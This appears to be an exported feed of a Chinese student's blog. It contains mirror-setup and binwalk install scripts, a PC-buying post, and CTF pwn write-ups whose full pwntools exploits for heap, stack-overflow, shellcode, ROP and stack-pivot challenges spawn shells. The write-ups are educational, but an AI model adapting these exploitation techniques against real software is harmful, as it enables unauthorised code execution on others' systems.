class="built_in">echo</span> <span class="string">&quot;deb http://mirrors.aliyun.com/ubuntu/ <span class="variable">$codename</span> main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list</span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ <span class="variable">$codename</span> main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list</span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;deb http://mirrors.aliyun.com/ubuntu/ <span class="variable">$codename</span>-security main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list</span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ <span class="variable">$codename</span>-security main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list</span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;deb http://mirrors.aliyun.com/ubuntu/ <span class="variable">$codename</span>-updates main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list</span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ <span class="variable">$codename</span>-updates main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list</span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;deb http://mirrors.aliyun.com/ubuntu/ <span class="variable">$codename</span>-backports main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list</span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ <span class="variable">$codename</span>-backports main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list</span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;deb http://mirrors.aliyun.com/ubuntu/ <span class="variable">$codename</span>-proposed main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list</span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;deb-src http://mirrors.aliyun.com/ubuntu/ <span class="variable">$codename</span>-proposed main restricted universe multiverse&quot;</span> &gt;&gt; /etc/apt/sources.list</span><br><span class="line"></span><br><span class="line">sudo apt-get update</span><br><span class="line"><span class="comment">#BLOCK</span></span><br><span class="line"><span class="comment"># [*]change pip sources to aliyun source</span></span><br><span class="line"><span class="keyword">if</span> [ ! -d ~/.pip ];<span class="keyword">then</span></span><br><span class="line">    mkdir ~/.pip</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> [ -f ~/.pip/pip.conf ];</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    sudo mv ~/.pip/pip.conf ~/.pip/pip.conf.bak</span><br><span class="line">    sudo touch ~/.pip/pip.conf</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    sudo touch ~/.pip/pip.conf</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;[global]&quot;</span> &gt;&gt; ~/.pip/pip.conf</span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">&quot;index-url = https://mirrors.aliyun.com/pypi/simple&quot;</span> &gt;&gt; ~/.pip/pip.conf</span><br></pre></td></tr></table></figure><p>binwalk完整下载脚本：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#dependencies</span></span><br><span class="line">sudo apt -y install python-lzma python-crypto</span><br><span class="line">sudo apt -y install libqt4-opengl python-opengl python-qt4 python-qt4-gl python-numpy python-scipy python-pip</span><br><span class="line"></span><br><span class="line">sudo pip install pyqtgraph</span><br><span class="line">sudo pip install capstone</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install standard extraction utilities（必选）  </span></span><br><span class="line">sudo apt -y install mtd-utils gzip bzip2 tar arj lhasa p7zip p7zip-full cabextract cramfsswap squashfs-tools sleuthkit default-jdk lzop srecord</span><br><span class="line"><span class="comment">#Install binwalk</span></span><br><span class="line"><span class="comment">#sudo apt-get install binwalk</span></span><br><span class="line"><span class="built_in">cd</span> binwalk</span><br><span class="line">sudo python setup.py install</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install sasquatch to extract non-standard SquashFS images（必选）  </span></span><br><span class="line">sudo apt -y install zlib1g-dev liblzma-dev liblzo2-dev  </span><br><span class="line"><span class="built_in">cd</span> sasquatch &amp;&amp; sudo ./build.sh</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install jefferson to extract JFFS2 file systems（可选）  </span></span><br><span class="line">sudo pip install cstruct  </span><br><span class="line"><span class="built_in">cd</span> jefferson &amp;&amp; sudo python setup.py install</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment"># Install ubi_reader to extract UBIFS file systems（可选）  </span></span><br><span class="line">sudo apt -y install liblzo2-dev python-lzo   </span><br><span class="line"><span class="built_in">cd</span> ubi_reader &amp;&amp; sudo python setup.py install</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"><span class="comment"># Install yaffshiv to extract YAFFS file systems（可选）   </span></span><br><span class="line"><span class="built_in">cd</span> yaffshiv &amp;&amp; sudo python setup.py install</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="comment">#install unstuff (closed source) to extract StuffIt archive files</span></span><br><span class="line">sudo cp stuff/bin/unstuff /usr/<span class="built_in">local</span>/bin/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意脚本命为install_binwalk.sh</span></span><br><span class="line"><span class="comment">#该脚本目前只适用于Python2.7</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="固件" scheme="http://example.com/categories/%E5%9B%BA%E4%BB%B6/"/>
    
    
    <category term="iot" scheme="http://example.com/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>硬件实训一</title>
    <link href="http://example.com/2020/12/14/%E7%A1%AC%E4%BB%B6%E5%AE%9E%E8%AE%AD%E4%B8%80/"/>
    <id>http://example.com/2020/12/14/%E7%A1%AC%E4%BB%B6%E5%AE%9E%E8%AE%AD%E4%B8%80/</id>
    <published>2020-12-14T05:33:53.000Z</published>
    <updated>2020-12-14T05:44:01.678Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="台式计算机的硬件选购"><a href="#台式计算机的硬件选购" class="headerlink" title="台式计算机的硬件选购"></a>台式计算机的硬件选购</h1><p>任务：5000块以下配置一台学习人工智能的计算机</p><p>第一节实训课我直接“啊这”好吧，让一个选择恐惧症去京东shopping简直就是折磨，关键还一口气shopping了一个上午。</p><p>下面是我选的配置（5000以下配置人工智能的计算机，简直了好吧！）</p><p><strong>intel:</strong></p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD1-1.png"></p><p><strong>AMD</strong>:</p><p><img src="/postimg/%E5%AE%9E%E8%AE%AD1-2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="实训" scheme="http://example.com/categories/%E5%AE%9E%E8%AE%AD/"/>
    
    
    <category term="实训" scheme="http://example.com/tags/%E5%AE%9E%E8%AE%AD/"/>
    
  </entry>
  
  <entry>
    <title>ZJCTF_2019_EasyHeap</title>
    <link href="http://example.com/2020/12/02/ZJCTF-2019-EasyHeap/"/>
    <id>http://example.com/2020/12/02/ZJCTF-2019-EasyHeap/</id>
    <published>2020-12-02T13:41:42.000Z</published>
    <updated>2020-12-02T15:59:01.629Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p><img src="/postimg/1.png"></p><p>有system函数，那么就很好了，不用泄露libc了，直接跳转拿到flag？不可能的，这是个坑，里面什么都没有。</p><p><img src="/postimg/2.png"></p><p>edit函数可以竟然可以重新编辑堆块的大小，堆溢出！！！</p><p><img src="/postimg/3.png"></p><p>delete函数没什么用，free后置零，不存在uaf。</p><p>思路：</p><p>1、申请三个堆块，将/bin/sh写入chunk1。</p><p>2、利用house of spirit伪造堆块（伪造 chunk 至 heaparray 附近，这样操作在 malloc fastbin 时需要绕过大小判断，我们可以巧妙地利用地址开头 7f 来伪造大小为 0x70 的 fastbin ）</p><p>3、利用伪造的堆块将chunk0的地址覆盖为free_got地址</p><p>4、将free_got地址改写为system的地址</p><p>5、此时free chunk1就能拿到shell。</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29073</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&quot;./easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content of heap:&#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(content))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Size of Heap : &#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Content of heap : &#x27;</span>)</span><br><span class="line">p.send(<span class="built_in">str</span>(content))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment">#fastbin  0</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;bbbb&#x27;</span>)<span class="comment">#fastbin  1</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;cccc&#x27;</span>)<span class="comment">#fastbin  2</span></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">&#x27;/bin/sh\x00&#x27;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x60</span> + p64(<span class="number">0x71</span>) + p64(<span class="number">0x6020b0</span>-<span class="number">3</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"> </span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;aaaa&#x27;</span>)<span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x68</span>,<span class="string">&#x27;c&#x27;</span>)<span class="comment"># 3</span></span><br><span class="line"> </span><br><span class="line">payload = <span class="string">&#x27;\xaa&#x27;</span> * <span class="number">3</span> + p64(<span class="number">0</span>) * <span class="number">4</span> + p64(free_got)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">payload = p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>具体过程：</p><p>1、create 0、1、2，free 2</p><p><img src="/postimg/4.png"></p><p>2、将/bin/sh写入chunk1，发送第一段payload，伪造fake_chunk,选择0x6020b0-3为了绕过house of spirit的检查，以0x7f作为fastbin的大小的堆块。</p><p><img src="/postimg/5.png"></p><p><img src="/postimg/6.png"></p><p>3、create 2、3（之前已经free2，根据bins链表，重新生成的分别是之前的chunk2，和我们伪造的fake_chunk)</p><p><img src="/postimg/7.png"></p><p>4、发送第二段payload，修改chunk0的地址为free_got地址</p><p><img src="/postimg/8.png"></p><p>5、发送第三段payload，改写free_got表地址为system地址</p><p><img src="/postimg/9.png"></p><p>5、free 1,拿到shell（此时调用的即为system函数，chunk1的内容为/bin/sh）</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\js\APlayer.min.js&quot; class=&quot;aplayer-se</summary>
      
    
    
    
    <category term="heap" scheme="http://example.com/categories/heap/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>Dmctf_pwn题解</title>
    <link href="http://example.com/2020/12/01/Dmctf-pwn%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2020/12/01/Dmctf-pwn%E9%A2%98%E8%A7%A3/</id>
    <published>2020-12-01T11:37:53.000Z</published>
    <updated>2020-12-01T11:52:51.177Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><p><strong>以下题均请注意glibc版本问题</strong></p><h1 id="intoverflow"><a href="#intoverflow" class="headerlink" title="intoverflow"></a>intoverflow</h1><p>整数溢出绕过，跳转到后门函数</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./intoverflow&#x27;</span>)</span><br><span class="line">system_addr = <span class="number">0x8048645</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Now,we need a password&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x15</span> + <span class="string">&#x27;b&#x27;</span> * <span class="number">4</span> + p32(system_addr)</span><br><span class="line">payload  += <span class="string">&#x27;a&#x27;</span> * (<span class="number">261</span> - <span class="built_in">len</span>(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h1><p>栈溢出跳转至后门函数</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">system_addr = <span class="number">0x4006ba</span></span><br><span class="line">p = process(<span class="string">&#x27;./stackoverflow&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote()</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Welcome to DMCTF,please input your name!&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x10</span> + <span class="string">&#x27;b&#x27;</span> * <span class="number">8</span> + p64(system_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>程序泄露buf地址，发送shellcode，跳转到shellcode执行</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p =process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.recvline()</span></span><br><span class="line">ret_addr = <span class="built_in">int</span>(p.recvline()[<span class="number">0</span>:<span class="number">14</span>],<span class="number">16</span>)</span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(ret_addr)</span><br><span class="line"></span><br><span class="line">payload = shellcode</span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span> * (<span class="number">0x90</span>+<span class="number">8</span>-<span class="built_in">len</span>(shellcode))</span><br><span class="line">payload += p64(ret_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Admin-Panel"><a href="#Admin-Panel" class="headerlink" title="Admin Panel"></a>Admin Panel</h1><p>利用整数溢出突破输入长度限制进行栈溢出。</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data: p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa = <span class="keyword">lambda</span> delim,data: p.sendafter(delim,<span class="built_in">str</span>(data))</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data: p.sendlineafter(delim,<span class="built_in">str</span>(data))</span><br><span class="line">r = <span class="keyword">lambda</span> num=<span class="number">4096</span>: p.recv(num)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span>: p.recvuntil(delims,drop)</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data: u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr: log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./admin_panel&#x27;</span></span><br><span class="line">context.binary = binary</span><br><span class="line">elf = ELF(binary,checksec=<span class="literal">False</span>)</span><br><span class="line">p = process(binary)</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;Username: &#x27;</span>, <span class="string">&#x27;merc&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x19</span>+<span class="number">4</span>), <span class="number">0x804864b</span>).ljust(<span class="number">260</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Password: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="shutup"><a href="#shutup" class="headerlink" title="shutup"></a>shutup</h1><p>利用栈溢出调用 read 读取 shellcode 到 bss 段，最后跳转到 bss 段执行 shellcode。</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> data: p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa = <span class="keyword">lambda</span> delim,data: p.sendafter(delim,<span class="built_in">str</span>(data))</span><br><span class="line">sl = <span class="keyword">lambda</span> data: p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla = <span class="keyword">lambda</span> delim,data: p.sendlineafter(delim,<span class="built_in">str</span>(data))</span><br><span class="line">r = <span class="keyword">lambda</span> num=<span class="number">4096</span>: p.recv(num)</span><br><span class="line">ru = <span class="keyword">lambda</span> delims,drop=<span class="literal">True</span>: p.recvuntil(delims,drop)</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data: u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">leak = <span class="keyword">lambda</span> name,addr: log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line">binary = <span class="string">&#x27;./shutup&#x27;</span></span><br><span class="line">context.binary = binary</span><br><span class="line">elf = ELF(binary,checksec=<span class="literal">False</span>)</span><br><span class="line">p = process(binary)</span><br><span class="line"></span><br><span class="line">pop3 = <span class="number">0x8048539</span></span><br><span class="line">s(flat(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0x18</span>+<span class="number">4</span>), elf.plt[<span class="string">&#x27;read&#x27;</span>], pop3, <span class="number">0</span>, elf.bss(), <span class="number">0x100</span>, elf.bss()))</span><br><span class="line">s(asm(shellcraft.sh()))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h1><p>简单的rop链构造</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    p = remote(<span class="string">&#x27;dmctf.vaala.cloud&#x27;</span>,<span class="number">28182</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    elf=ELF(<span class="string">&#x27;./babystack&#x27;</span>)</span><br><span class="line">    pop_rbp_ret=<span class="number">0x0000000000400520</span></span><br><span class="line">    pop_rdi_ret=<span class="number">0x0000000000400663</span></span><br><span class="line">    write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    libc_start_main_got=elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    p.recvuntil(<span class="string">&quot;PWNME,PWNME,PWMME!!!\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(p)</span></span><br><span class="line">    main=<span class="number">0x00000000004005B6</span></span><br><span class="line">    rsi_r15_ret=<span class="number">0x0000000000400661</span></span><br><span class="line">    payload1=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(pop_rdi_ret)+p64(<span class="number">1</span>)+p64(rsi_r15_ret)+p64(libc_start_main_got)+p64(<span class="number">0</span>)+p64(write_plt)+p64(main)</span><br><span class="line"></span><br><span class="line">    p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># p.recv()</span></span><br><span class="line">    <span class="comment">#打印出write()函数在got表中的地址</span></span><br><span class="line">    libc_start_main_add=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;libc_start_main_add=&quot;</span>+<span class="built_in">hex</span>(libc_start_main_add)</span><br><span class="line">    libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,libc_start_main_add)</span><br><span class="line">    libc_base=libc_start_main_add-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">    system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">    bin_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;system_addr = &quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">    <span class="built_in">print</span>  (<span class="string">&quot;bin_addr = &quot;</span>+<span class="built_in">hex</span>(bin_addr))</span><br><span class="line">    p.recv()</span><br><span class="line">    payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret)+p64(bin_addr)+p64(system_addr)</span><br><span class="line">    p.sendline(payload2)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="easyStack"><a href="#easyStack" class="headerlink" title="easyStack"></a>easyStack</h1><p>简单的栈迁移(libc为2.27)</p><p><strong>exp:</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span> , os = <span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;, env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">p = remote(<span class="string">&quot;dmctf.vaala.cloud&quot;</span>, <span class="number">28382</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pwn_addr = <span class="number">0x4006AE</span></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400803</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000400801</span></span><br><span class="line">leave_ret = <span class="number">0x000000000040071f</span></span><br><span class="line">one = <span class="number">0x601160</span></span><br><span class="line">two = <span class="number">0x601060</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># gdb.attach(p, &#x27;b *0x40071F\n&#x27;)</span></span><br><span class="line">    payload = p64(two) + p64(pop_rdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(leave_ret)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;name?&#x27;</span>, payload)</span><br><span class="line">    payload = p64(one) + p64(pop_rdi) + p64(<span class="number">0</span>) + p64(pop_rsi_ret) + p64(one + <span class="number">8</span>) + p64(<span class="number">0</span>) + 